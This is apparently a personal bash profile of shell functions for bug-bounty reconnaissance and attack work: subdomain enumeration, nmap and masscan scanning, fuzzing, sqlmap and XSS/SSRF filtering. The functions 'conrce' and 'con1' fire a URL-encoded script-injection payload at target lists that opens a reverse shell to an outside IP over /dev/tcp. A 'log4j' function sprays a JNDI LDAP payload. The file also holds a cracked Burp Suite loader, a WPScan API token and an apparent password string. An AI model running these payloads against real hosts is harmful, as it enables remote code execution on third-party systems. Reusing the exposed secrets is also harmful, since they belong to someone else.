#!/bin/bash

whall(){
    for i in $(cat $2); do python3 ~/tools/tools/who.py "$1" $i; sleep 2; done
}
wh(){
    whois $1 | grep -iE 'Organization|Email'
}
gall(){
    find . -type f -name $1 | xargs -n1 -I{} cat {} | sort -u
}
arg(){
    cat $1 | awk '{print $NF"   "$1" "$(NF-1)}' | tr -d '[]' | sort -u | sort -n > sorted
    uniqurls.py $1 | sort -u | sort -n > uniq
}

see-buckets(){
    for i in $(cat $1 | cut -d '.' -f 1);do echo --; echo $i;aws s3 ls s3://$i;done
}
one(){
    sudo airmon-ng start wlo1
}
notone(){
    sudo airmon-ng stop wlo1mon
}
see(){
    ls -s -S -k -h --color | vi -
}
resolvers(){
    dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt
}
tekken(){
    wine ~/test/Tekken_3.exe & exit
}
conn(){
    ping www.google.com
}
js(){
    grep -i -E "admin|auth|api|jenkins|corp|dev|stag|stg|prod|sandbox|swagger|aws|azure|uat|test|vpn|cms|token|credentials|user|password|key|email|" $1
}
g(){
    grep -Hnir "$1" | vim -
}
srcprofile(){
	source ~/tools/.bash_profile
}
edpro(){
	vim ~/tools/.bash_profile
}
burp(){
	cd '/home/rocky/tools/burp/Burp Suite Professional Edition v2022.3.7'
    java -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:Dr-FarFar.jar -jar burpsuite_pro_v2022.3.7.jar & exit
}
getroot(){
	cat $1 | rev | cut -d "." -f 1,2 | rev | sort -u | tee -a root-$1
}
getintresting(){
		cat $1 | grep -aiE 'uat|test|prod|admin|stag|jenkins|jankins|jire|jira|smal|auth|outh|corp|api|v1|test' | tee -a potential-$1
}
server(){
    sudo python3 -m http.server $1
}
bruteable(){
    bruteable.py $1 | rev | cut -d "." -f 1,2,3,4 | rev | sort -u
}
#-----------------------subdomain-discovery-------------------------
crtsh(){
	python3 ~/tools/tools/crtsh.py "$1"
}
domains(){
	python3 ~/tools/tools/domains.py "$1"
}
subfind(){
	cat $1 | xargs -n1 -P4 -I{} subfinder -silent -d {}
}
sublist(){
	cat $1 | xargs -n1 -I{} sublist3r -n -d {}
}
brutelist(){
    cat $1 | xargs -n1 -P4 -I{} shuffledns -w ~/tools/SecLists/Discovery/DNS/dns-Rocky.txt -d {} -silent -r ~/tools/tools/files/resolvers.txt
}
brute(){
    cat $1 | xargs -n1 -I{} sh -c "cat $2 | grep {}$ | shuffledns -d {} -r ~/tools/tools/files/resolvers.txt -silent" | tee -a $3
}
bruteall(){
	for i in $(cat $1)
	do
		shuffledns -w $2 -d $i -silent -r ~/tools/tools/files/resolvers.txt -strict-wildcard
	done
}

crtshnahamsec(){
	curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}
aqua(){
	cat $1 | ~/tools/aquatone/aquatone -out aquatone/
}

#-----------------port-snanning--------------------------------------
nm(){
	sudo nmap -T4 -Pn -v -sV -sC $1
}
nms(){
	sudo nmap -T4 --script=http-title -v -Pn -oN nmap-$1 $1
}
nma(){
	sudo nmap -Pn -T4 -v -A $1
}
nmall(){
	sudo nmap -T4 --script=http-title -v -Pn -iL $1 -oN $2
}
nmp(){
    sudo nmap -sC -sV -T4 -Pn -p$1 -v $2
}
mscan(){
	sudo masscan -p0-65535 $1 --rate=200 --open
}
msall(){
	sudo masscan -p0-65535 -iL $1 --rate=1500 --open -oG masscan-all-$1
}
mslist(){
	sudo masscan -p2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443,19000,19080 --rate=10000 --open -iL $1 -oG masscan-$1
}
mstop(){
	sudo masscan -p1-1000,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443,19000,19080 --rate=10000 --open -iL $1 -oG masscan-top-$1

}

#---------------------content-discovery------------------------------
dirsearch(){
	python3 ~/tools/dirsearch/dirsearch.py -w ~/tools/tools/files/dict.txt -u $1 -t 200 -e $2 -H 'X-Forwarded-For: 127.0.0.1' $3 $4 $5 $6
}
dlist(){
	python3 ~/tools/dirsearch/dirsearch.py -r -u $1 -w $2 -H 'X-Forwarded-For:127.0.0.1' -e $3 -t 200 $4 $5 $6 $7
}
wayback(){
	echo $1 | waybackurls
}
waybackall(){
	for i in $(cat $1)
	do
		echo $i | waybackurls
	done
}

#-----------------------recon---------------------------------------
recon(){
	#recon.py on root domains
    cat $1 | xargs -n1 -P4 -I{} recon.py {} | anew domains

    #subfinder
	cat $1 | xargs -n1 -P4 -I{} subfinder -silent -d {} | anew domains

    #amass
    cat $1 | xargs -n1 -I{} sh -c "amass enum -passive -nolocaldb -nocolor -config ~/tools/amass/config.ini -d {}" | anew domains

    #clean domains
    sanitizer.py $1 domains | sort -u > t
    rm domains
    mv t domains

    #get third-level-domains
    3levels.py domains > third-level-domains

    #recon on third-level-domains
    cat third-level-domains | xargs -n1 -P10 -I{} recon.py {} | anew domains
    cat third-level-domains | xargs -n1 -P10 -I{} subfinder -silent -d {} | anew domains
    
    #clean domains
    sanitizer.py $1 domains | sort -u > t
    rm domains
    mv t domains
}
probe(){
    cat $1 | httpx -silent
}
urls(){
    cat $1 | xargs -n1 -P4 -I{} geturls.py {} > urls
}
apis(){
    grep -Hnro -E 'AIza[0-9A-Za-z_-]{35}|AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}|EAACEdEose0cBA[0-9A-Za-z]+'
}
rlist(){
    cat $1 | xargs -n1 -P4 -I{} recon.py {}
}
am(){
    cat $1 | xargs -P4 -n1 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
}
param(){
    arjun -u $1 -w ~/tools/tools/files/parameters.txt $2 $3 
}
fuzz(){
    ffuf -u $1 -w ~/tools/tools/files/fdict.txt -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
}
fuzzw(){
    ffuf -u $1 -w $2 -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $3 $4 $5 $6 $7 $8 $9 
}
jshunter(){
    cat $1 | httpx -fl 0 -mc 200 -content-length -sr -srd scripts/ -silent -no-color -o jsindex
}
beautifyall(){
    ls | xargs -n1 -I{} -P4 sh -c "beautify.py {}"
}
new(){
    for i in $(cat root)
    do
        amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $i
        subfinder -silent -d $i
        recon.py $i
        findomain -q -t $i
        sublist3r -n -d $i
    done | anew domains | tee -a new | dnsx -silent -o active-new
}
netData(){
    cat $1 | awk '{print $1}' | grep AS | sed 's/AS//g' > asn
    cat $1 | awk '{print $1}' | grep -v AS | grep '\.' > cidr
}
findd(){
    cat $1 | xargs -n1 -I{} -P4 sh -c "findomain -q -t {}"
}
subdomains(){
    amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $1
    subfinder -silent -d $1
    recon.py $1
    findomain -q -t $1
}
certspotter(){
    curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
}
enum(){
    #get alive
    cat domains | dnsx -resp -o resp -silent
    cat resp | awk '{print $1}' | sort -u | anew dns
    cat resp | awk '{print $2}' | tr -d '[]' | sort -u > ips
    clean_ips.py ips | anew ip_addresses

    #get data on active domains
    mkdir out
    cat dns | httpx -status-code -content-length -title -no-color -silent -location -p 443,8443,80,8080 -td -t 100 -o out/index
    
    #get active-domains
    cat out/index | awk '{print $1}' | sort -u > active-domains
    
}
struds(){
    cat $1 | httpx -path '/sm/login/loginpagecontentgrabber.do' -threads 100 -random-agent -x GET -title -tech-detect -status-code  -follow-redirects -title -mc 200 -no-color -content-length -o $2 
}
a(){
    amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $1
}
msd(){
    ./bin/massdns -r resolvers.txt -t A -o J subdomains.txt | jq 'select(.resp_type=="A") | .query_name' | sort -
}
sjack(){
    subjack -w $1 -t 100 -timeout 30 -c ~/tools/subjack/fingerprints.json -ssl
}
reconpad(){
    ssh -i "~/tools/server/servers.pem" ubuntu@43.204.212.209
}
checkey(){
    cat ~/bounty/maps-urls | sed "s/KEY_HERE/$1/g"
}
sdns(){
    shuffledns -d $1 -w $2 -r ~/tools/tools/files/resolvers.txt -strict-wildcard -silent
}
sendr(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@43.204.212.209:/home/ubuntu/$2
}
recvr(){
    scp -i "~/tools/server/servers.pem" ubuntu@43.204.212.209:/home/ubuntu/$1 $2
}
fp(){
    find . -name $1 | xargs -n1 -I{} cat {} | sort -u
}
pscan(){ 
	sudo nmap -T4 -sC -v -Pn -iL $1 -oN nmap-$1
	sudo masscan -p0-65535 -iL $2 --rate=700 --open -oG masscan-all-$2
}
portswigger(){
    echo '6#iEZ6|jkPM^]Gn638fJ98NHatJ[C~GA'

}
rem(){
    for i in $(ls)
    do
        python3 ~/test/tools/filter/rem.py $i >> t
    done
}
xss(){
    if [ $# != 2 ]
    then
        echo "need two arguments"
    else
        cat $1 | grep -a '=' | grep -vaE "\.(gif|jpeg|css|tif|tiff|png|woff|jpg|ico|pdf|svg|txt|js)" | kxss | tee -a $2 
    fi
}
sqli(){
    python3 ~/tools/sqlmap/sqlmap.py -m $1 --dbs --batch --risk 3
}
fuzzer(){
    ssh -i "~/tools/server/servers.pem" ubuntu@13.126.105.35
}
sendf(){
     scp -i "~/tools/server/servers.pem" $1 ubuntu@13.126.105.35:/home/ubuntu/$2
}
recvf(){
    scp -i "~/tools/server/servers.pem" ubuntu@13.126.105.35:/home/ubuntu/$1 $2
}
dork-root(){
    echo -n site:*.;join.py $1 | sed 's/,/ | site:*./g'
}
whm(){
    sudo python3 ~/tools/tools/whois-man.py $1 $2
}
sqlm(){
    python3 ~/tools/sqlmap/sqlmap.py -u $1 --risk 2 --dbs --batch $2 $3 $4 $5
}
sqlmf(){
    python3 ~/tools/sqlmap/sqlmap.py -r $1 --risk 3 --dbs --batch $2 $3 $4 $5 $6 $7 $8 $9
}
bounty(){
    ssh -i "~/tools/server/servers.pem" ubuntu@52.66.245.73
}
sendb(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@52.66.245.73:/home/ubuntu/$2
}
recvb(){
    scp -i "~/tools/server/servers.pem" ubuntu@52.66.245.73:/home/ubuntu/$1 $2
}
asn(){
    curl -s "http://asnlookup.com/api/lookup?org=$1" | jq -r '.[]'
}
scanner(){
    ssh -i "~/tools/server/servers.pem" ubuntu@3.110.208.108
}
sends(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.208.108:/home/ubuntu/$2
}
recvs(){
    scp -i "~/tools/server/servers.pem" ubuntu@3.110.208.108:/home/ubuntu/$1 $2
}
hx(){
    cat $1 | httpx -status-code -content-length -title -no-color -silent -location -td -t 100 
}
ver(){
    cd /home/rocky/recondata/verizonmedia/main/03-10-21
}
wps(){
    wpscan --url $1 --api-token 8GcfjAzhd9MApKYaAHNHDJHnJzpCKTHxaNrrvy99dmI
}
sort-index(){
    cat $1 | awk '{print $NF"  "$1"  "$(NF-1)}' | tr -d '[]' | sort -u | sort -n
}
y(){
    cd /home/rocky/recondata/verizonmedia/yahoo/23-10-21
}
roos(){
    join.py $1 | sed 's/,/|/g' | xargs -n1 -I{} sh -c "cat $2 | grep -avE '^({})$'"
}
u(){
    sudo apt -y update && sudo apt -y upgrade
}
wifix(){
    sudo rmmod mt76x0e
    sudo modprobe mt76x0e
}
log4j(){
    cat $1 | grep = | qsreplace '${jndi:ldap://x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}' | grep -vE 'www|join|invite|==' | urldedupe -s | httpx
}
lassan(){
    ssh -i "~/tools/server/lassan.pem" ubuntu@3.142.160.64
}
sendl(){
    scp -i "~/tools/server/lassan.pem" $1 ubuntu@3.142.160.64:/home/ubuntu/$2
}
recvl(){
    scp -i "~/tools/server/lassan.pem" ubuntu@3.142.160.64:/home/ubuntu/$1 $2
}
sendall(){
    echo 'reconpad'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@43.204.212.209:/home/ubuntu/$2
    echo 'fuzzer'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@13.126.105.35:/home/ubuntu/$2
    echo 'scanner'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.208.108:/home/ubuntu/$2
    echo 'bounty'
    scp -i "~/tools/server/servers.pem" $1 ubuntu@52.66.245.73:/home/ubuntu/$2
    echo 'receiver'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.153.25:/home/ubuntu/$2
}
sendallr(){
    echo 'reconpad'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@43.204.212.209:/home/ubuntu/$2
    echo 'fuzzer'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@13.126.105.35:/home/ubuntu/$2
    echo 'scanner'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.208.108:/home/ubuntu/$2
    echo 'bounty'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@52.66.245.73:/home/ubuntu/$2
    echo 'receiver'
    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.153.25:/home/ubuntu/$2
}

c(){
    curl -i -k --path-as-is $1 $2 $3 $4 $5 $6
}

work(){
    export PS1='\[\033[01;34m\]\n-(\[\033[01;31m\]rocky@dir\[\033[01;34m\])\[\033[01;31m\]~\[\033[01;34m\][\[\033[01;00m\]~\[\033[01;34m\]]\n\[\033[01;34m\] ~\[\033[01;31m\]$ \[\033[01;00m\]'
}
runcode(){
    export PS1='\[\033[01;32m\]\n-(\[\033[01;34m\]rocky@run\[\033[01;32m\])\[\033[01;34m\]~\[\033[01;32m\][\[\033[01;00m\]~\[\033[01;32m\]]\[\033[01;32m\] ~\[\033[01;34m\]$ \[\033[01;00m\]'
}
vu(){
    cat $1 | grep -a '\[200\]' | awk '{print $4" "$1}' | tr -d '[]' | python3 ~/test/tools/filter/uniq2.py - | sort -n
}
vr(){
    cat $1 | grep -aE '\[\/\/www.google.com\/re|\[\/\/\/www.google.com\/re|\[\/\/\/\/www.google.com\/re'
}
mdns(){
    massdns -r ~/tools/tools/files/resolvers.txt -t A -o S -w massdns-$1.out $1
}
alts(){
    ripgen -d $1 -w ~/tools/dnsgen/dnsgen/words.txt
}
uu(){
    cat $1 | grep -aE "$2" | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4" "$0}' | uniq2.py - | sort -n 
}
uhp(){
    cat $1 | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4"    "$0}' 
}
uhp3(){
    cat $1 | awk '{gsub("\[", "", $3);gsub("\]", "", $3);print $3"  "$0}' 
}
uhp2(){
    cat $1 | awk '{gsub("\[", "", $2);gsub("\]", "", $2);print $2"  "$0}' 
}
cache(){
    grep -Hnir 'x-cache' | awk -F ':' '{print $1}' | sort -u  | httpx -H 'X-Forwarded-Host: test123' -ms test123 -t 200
}
m2h(){
    masscan2http.py $1 | httpx -silent -no-color -title -status-code -content-length
}
grafana-tr(){
    echo $1 | httpx -silent -sc -cl -title -path ~/tools/tools/files/grafana-pt
}
domxss(){
    grep -Hnir -E "addEventListener\((?:'|\")message(?:'|\")" | awk -F '_' '{print $1}' | httpx -sc -cl
}
receiver(){
    ssh -i "~/tools/server/servers.pem" ubuntu@3.110.153.25
}
sendre(){
    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.153.25:/home/ubuntu/$2
}
recvre(){
    scp -i "~/tools/server/servers.pem" ubuntu@3.110.153.25:/home/ubuntu/$1 $2
}
n(){
    gedit ~/notes & exit
}
ser(){
    gedit ~/servers & exit
}
d5(){
    cd /media/rocky/24193e18-fd91-4da1-b89e-dafdfc04ab2b/
}
ama(){
    cat $1 | xargs -n1 -I{} sh -c "amass enum -active -trf ~/tools/tools/files/resolvers.txt -tr 8.8.8.8 -config ~/tools/amass/config.ini -o {}.out -d {}"
}
sbrc(){
    source ~/.bashrc
}
ebrc(){
    vi ~/.bashrc
}
zap(){
    java -jar ~/ZAP/zap-2.11.1.jar & exit
}
sd(){
    cat targets-data.txt | grep -aE $1 | awk -F ',' '{print $1}' | xargs -n1 -I{} sh -c "cat http-result | grep -a {}" 
}
conrce(){
    cat $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/43.204.212.209/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
}
con1(){
    echo $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/43.204.212.209/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
}
autowhois(){
    cat $2 | xargs -n1 -I{} sh -c "whois {} | grep -aiE $1>/dev/null && echo {};sleep 1"
}
xnlf(){
    python3 ~/tools/xnLinkFinder/xnLinkFinder.py -p 50 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -i $1 -o cli -d 3 | sed "s/^\//$1\//g"
}
xnall(){
    python3 ~/tools/xnLinkFinder/xnLinkFinder.py -p 50 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -i $1 -o cli -d 3 | sed "s/^\//$1\//g"
}
fall(){
    xargs -P `nproc` -I {} sh -c 'url="{}"; ffuf -mc all -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" -u "{}/FUZZ" -w ~/tools/tools/files/dict.txt -t 200 -ac -se -o fuzz/${url##*/}-${url%%:*}.json' < $1
    cat fuzz/* | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' ' - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' > result.txt

    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
    guniq 1 r | sort -n > uniq-result.txt
    rm r
}
sqltest()
{
    cat $1 | grep -vE 'Cloudflare|Akamai|Apache|Error|www|Nginx|Cloudfront|IIS|400|50[0-9]|\[0\]|Access'
}
srf(){
    sendf root recon/
    sendf out-of-scope recon/
}
ssrf(){
    cat $1 | grep -aiE 'host\=|redirect\=|uri\=|path\=|continue\=|url\=|window\=|next\=|data\=|image-source\=|n\=|to\=|follow\=|u\=|go\=|fetch\=|source\=|img\-src\='
}
vhost(){
    ffuf -u $1 -H "Host: FUZZ.$2" -t 200 -c -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0" -H "X-Forwarded-For: 127.0.0.1" -w ~/tools/tools/files/best-dns-wordlist.txt -ac -mc all
}
countd(){
    cat root | xargs -n1 -I{} sh -c "echo {};echo '';cat out/index | grep -aiE '\.{}';echo '';echo '--------------------------------------------------------------------------'"
}
crawl()
{
    echo $1 | hakrawler | httpx -silent -http-proxy http://127.0.0.1:8080
}
scan-takeovers()
{
    while :
    do  
        for i in $(ls | grep -aE '^x')
        do 
            SubOver -t 200 -timeout 10 -l $i
        done | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | anew takeovers.txt | notify.py
        sleep 10800
    done
}
vs(){
    code . && exit
}
bruted(){
    for i in $(cat $1)
    do
        puredns bruteforce -r ~/tools/tools/files/resolvers.txt -w $i.out ~/tools/tools/files/dns-Rocky-small.txt $i
    done
}
perm(){
    gotator -sub $1 -perm ~/tools/dnsgen/dnsgen/words.txt -depth 2 -numbers 5 -silent
}
resv(){
    puredns resolve -r ~/tools/tools/files/resolvers.txt -w $1.out $1
}
dt(){
    pwd | cut -d '/' -f5 | xargs -n1 -I{} sh -c "scp -i "~/tools/server/servers.pem" ubuntu@13.126.105.35:/home/ubuntu/{}.tar.gz ."
}
ufr(){
    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
    guniq 1 r | sort -n > uniq-result.txt
    rm r
}
